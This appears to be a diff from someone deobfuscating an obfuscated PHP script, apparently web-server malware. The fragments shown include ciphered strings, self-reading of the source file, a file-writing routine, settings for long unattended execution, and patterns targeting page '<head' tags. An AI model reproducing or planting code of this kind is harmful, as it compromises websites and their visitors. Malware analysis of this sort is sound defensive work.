@@ -112,8 +112,8 @@ function l11b68x($l1W){
 }
 */
 
-//$bbbb66b6 = file_get_contents(__FILE__);
 $bbbb66b6 = file_get_contents(__FILE__);
+//$bbbb66b6 = file_get_contents("obs.txt");
 
 // <Insert long> $b6b66b = ..
 // Solve function l1FLe62h
@@ -131,21 +131,30 @@ foreach($b6b66b as $i=>$cipher){
 @extract($b6b66b);
 
 
-preg_match(l1FLe62h("K/@mJB3pOxjmNx8y"),$bbbb66b6,$_SESSION["oO0Oo0OO0"]);
+//echo l1FLe62h("K/@mJB3pOxjmNx8y");
+
+//preg_match(l1FLe62h("K/@mJB3pOxjmNx8y"),$bbbb66b6,$_SESSION["oO0Oo0OO0"]);
+preg_match("/@'(.*?)';/s",$bbbb66b6,$_SESSION["oO0Oo0OO0"]);
+// Store function/variable in session?
+
+//print_r($_SESSION);
+
+//exit();
+
 @set_time_limit(7200);
 @ignore_user_abort(1);
 @ob_start();
 
-$l1Qhzk2="";
-$l1go=0;
-$l1GRfrF8="";
-$l1imRR=$l11ufJ=0;
-$l1fCx83H="";
-$l1VtbCwB="";
-$l1Vvtr=".";
-$l1bS3es=$l1o7fR=$l1M=$l1EbALe=$l1h=$l1Z4k=$l1Ni6=$l1VQ="";
-$l1T2=$l1gfDiJL=$l1NhADdH=$l1h1=$l135vXS=$l1bhL8Zi=$l1GH0rfZ=array();
-$l1I=$_SERVER["DOCUMENT_ROOT"];
+$l1Qhzk2 = "";
+$l1go = 0;
+$l1GRfrF8 = "";
+$l1imRR = $l11ufJ = 0;
+$l1fCx83H = "";
+$l1VtbCwB = "";
+$l1Vvtr = ".";
+$l1bS3es = $l1o7fR = $l1M = $l1EbALe = $l1h = $l1Z4k = $l1Ni6 = $l1VQ="";
+$l1T2 = $l1gfDiJL = $l1NhADdH = $l1h1 = $l135vXS = $l1bhL8Zi = $l1GH0rfZ = array();
+$l1I = $_SERVER["DOCUMENT_ROOT"];
 
 /* Write file */
 function l1AeQJ($fname,$content='',$mode='w'){
@@ -1156,3 +1165,7 @@ exit();
 echo file_get_contents($l1ko);
 }}l1P9LVD();
 
+echo "\n";
+// End
+//echo $GLOBALS["bb66666"]; // /\[0\:.*?\]/si
+//echo $GLOBALS["bbb66bb6b"]; // /<head.*%s>/si
